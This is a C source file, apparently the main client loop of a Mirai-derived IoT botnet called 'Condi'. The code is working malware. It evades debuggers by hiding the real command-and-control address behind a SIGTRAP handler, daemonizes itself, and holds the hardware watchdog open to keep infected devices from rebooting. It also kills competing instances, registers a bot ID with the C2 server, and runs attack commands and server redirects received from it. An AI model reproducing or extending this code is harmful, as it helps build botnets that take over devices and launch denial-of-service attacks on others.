#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/rand.h"
#include "headers/attack.h"
#include "headers/resolv.h"
#include "headers/killer.h"
#include "headers/util.h"
#include "headers/cnc.h"
#include "headers/redirect.h"
#include "headers/update.h"

ipv4_t LOCAL_ADDR;

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static void ensure_single_instance(void);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1, watchdog_pid = 0;
BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr;

#ifdef DEBUG
    static void segv_handler(int sig, siginfo_t *si, void *unused)
    {
        printf("got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
        exit(EXIT_FAILURE);
    }
#endif


#ifdef WATCHDOG
void watchdog_maintain(void)
{
    watchdog_pid = fork();
    if(watchdog_pid > 0 || watchdog_pid == -1)
        return;

    int timeout = 1;
    int watchdog_fd = 0;
    int found = FALSE;

    table_unlock_val(TABLE_MISC_WATCHDOG);
    table_unlock_val(TABLE_MISC_WATCHDOG2);
    table_unlock_val(TABLE_MISC_WATCHDOG3);
    table_unlock_val(TABLE_MISC_WATCHDOG4);
    table_unlock_val(TABLE_MISC_WATCHDOG5);
    table_unlock_val(TABLE_MISC_WATCHDOG6);
    table_unlock_val(TABLE_MISC_WATCHDOG7);
    table_unlock_val(TABLE_MISC_WATCHDOG8);
    table_unlock_val(TABLE_MISC_WATCHDOG9);

    if((watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG2, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG3, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG4, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG5, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG6, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG7, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG8, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG9, NULL), 2)) != -1)
    {
        #ifdef DEBUG
            printf("[watchdog] found a valid watchdog driver\n");
        #endif
        found = TRUE;
        ioctl(watchdog_fd, 0x80045704, &timeout);
    }
    
    if(found)
    {
        while(TRUE)
        {
            #ifdef DEBUG
                printf("[watchdog] sending keep-alive ioctl call to the watchdog driver\n");
            #endif
            ioctl(watchdog_fd, 0x80045705, 0);
            sleep(10);
        }
    }
    
    table_lock_val(TABLE_MISC_WATCHDOG);
    table_lock_val(TABLE_MISC_WATCHDOG2);
    table_lock_val(TABLE_MISC_WATCHDOG3);
    table_lock_val(TABLE_MISC_WATCHDOG4);
    table_lock_val(TABLE_MISC_WATCHDOG5);
    table_lock_val(TABLE_MISC_WATCHDOG6);
    table_lock_val(TABLE_MISC_WATCHDOG7);
    table_lock_val(TABLE_MISC_WATCHDOG8);
    table_lock_val(TABLE_MISC_WATCHDOG9);

    #ifdef DEBUG
        printf("[watchdog] failed to find a valid watchdog driver, child exiting\n");
    #endif

    exit(0);
}
#endif


int main(int argc, char **args)
{
    char *tbl_exec_succ, name_buf[32], id_buf[32];
    int name_buf_len = 0, tbl_exec_succ_len = 0, pgid = 0, pings = 0;

    #ifndef DEBUG
        sigset_t sigs;

        sigemptyset(&sigs);
        sigaddset(&sigs, SIGINT);
        sigprocmask(SIG_BLOCK, &sigs, NULL);
        signal(SIGCHLD, SIG_IGN);
        signal(SIGTRAP, anti_gdb_entry); //&

    #endif

    #ifdef DEBUG
        printf("Condi debug mode\n");

        sleep(1);
    #endif

    LOCAL_ADDR = util_local_addr();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = htons(FAKE_CNC_PORT);

    table_init();
    anti_gdb_entry(0);
    rand_init();

    util_zero(id_buf, 32);
    if(argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }
    update_set_bot_id(id_buf);

    table_unlock_val(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(TABLE_EXEC_SUCCESS);

    attack_init();

    /* Android APK ProcessBuilder waits on this PID — do not daemonize. */
#ifndef ANDROID
#ifndef DEBUG
    if (fork() > 0)
        return 0;
    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif

#ifdef WATCHDOG
    watchdog_maintain();
#endif

#ifdef KILLER
    killer_init();
#endif
#endif /* !ANDROID */

    ensure_single_instance();

    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        // Socket for accept()
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        // Set up CNC sockets
        if (fd_serv == -1)
            establish_connection();

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        // Get maximum FD for select
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        // Wait 10s in call to select()
        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
#ifdef DEBUG
            printf("select() errno = %d\n", errno);
#endif
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0)
                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
        }

        // Check if we need to kill ourselves
        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
        {
            struct sockaddr_in cli_addr;
            socklen_t cli_addr_len = sizeof (cli_addr);

            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);

            #ifdef DEBUG
                printf("[main] Detected newer instance running! Killing self\n");
            #endif
                kill(pgid * -1, 9);
                if(watchdog_pid != 0)
                    kill(watchdog_pid, 9);
                exit(0);
        }

        if(pending_connection)
        {
            pending_connection = FALSE;

            if(!FD_ISSET(fd_serv, &fdsetwr))
            {
                #ifdef DEBUG
                    printf("[main] timed out while connecting to CNC\n");
                #endif
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof(err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if(err != 0)
                {
                    #ifdef DEBUG
                        printf("[main] error while connecting to CNC code=%d\n", err);
                    #endif
                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand_next() % 10) + 1);
                }
                else
                {
                    LOCAL_ADDR = util_local_addr();
                    if (!cnc_send_registration(fd_serv, id_buf))
                    {
                        close(fd_serv);
                        fd_serv = -1;
                    }
                    else
                    {
                    #ifdef DEBUG
                        printf("[main] connected to CNC.\n");
                    #endif
                    }
                }
            }
        }
        else if(fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n = 0;
            uint16_t len = 0;
            char rdbuf[1024];

            errno = 0;
            n = recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL | MSG_PEEK);
            if(n == -1)
            {
                if(errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if(n == 0)
            {
                #ifdef DEBUG
                    printf("[main] lost connection with CNC (errno = %d) 1\n", errno);
                #endif
                teardown_connection();
                continue;
            }

            if(len == 0)
            {
                recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
                continue;
            }
            len = ntohs(len);
            if(len > sizeof(rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
                continue;
            }

            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if(n == -1)
            {
                if(errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if(n == 0)
            {
                #ifdef DEBUG
                    printf("[main] lost connection with CNC (errno = %d) 2\n", errno);
                #endif
                teardown_connection();
                continue;
            }

            recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
            len = ntohs(len);
            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

            #ifdef DEBUG
                printf("[main] received %d bytes from CNC\n", len);
            #endif

            if(len > 0)
            {
                ipv4_t new_addr;
                port_t new_port;

                cnc_dispatch(rdbuf, len);

                if (redirect_take(&new_addr, &new_port))
                {
                    cnc_send_ack(fd_serv, CNC_OP_REDIRECT, CNC_ACK_OK);
                    srv_addr.sin_family = AF_INET;
                    srv_addr.sin_addr.s_addr = new_addr;
                    srv_addr.sin_port = new_port;
                    resolve_func = NULL;
                    teardown_connection();
                }
            }
        }
    }

    return 0;
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
    #ifndef USEDOMAIN
    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_addr.s_addr = SERVIP;
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    table_lock_val(TABLE_CNC_PORT);
    #else
    struct resolv_entries *entries;
    entries = resolv_lookup(SERVDOM);
    if (entries == NULL)
    {
        srv_addr.sin_addr.s_addr = SERVIP;
        return;
    } else {
        srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    }
    
    resolv_entries_free(entries);
    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    table_lock_val(TABLE_CNC_PORT);
    #endif
}

static void establish_connection(void)
{
    #ifdef DEBUG
        printf("[main] attempting to connect to CNC\n");
    #endif

    if((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        #ifdef DEBUG
            printf("[main] failed to call socket(). Errno = %d\n", errno);
        #endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    if(resolve_func != NULL)
        resolve_func();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
}

static void teardown_connection(void)
{
    #ifdef DEBUG
        printf("[main] tearing down connection to CNC!\n");
    #endif

    if(fd_serv != -1)
        close(fd_serv);

    fd_serv = -1;
    sleep(1);
}

static void ensure_single_instance(void)
{
    struct sockaddr_in addr;
    int tries, fd;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(0x7f000001);
    addr.sin_port = htons(1024 + ((ntohl(LOCAL_ADDR) >> 8) & 0x7fff));

    for (tries = 0; tries < 2; tries++)
    {
        fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd == -1)
            return;

        if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1)
        {
            int killer = socket(AF_INET, SOCK_STREAM, 0);

            if (killer != -1)
            {
                connect(killer, (struct sockaddr *)&addr, sizeof(addr));
                close(killer);
            }
            close(fd);
            sleep(1);
            continue;
        }

        listen(fd, 1);
        fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
        fd_ctrl = fd;
        return;
    }
}
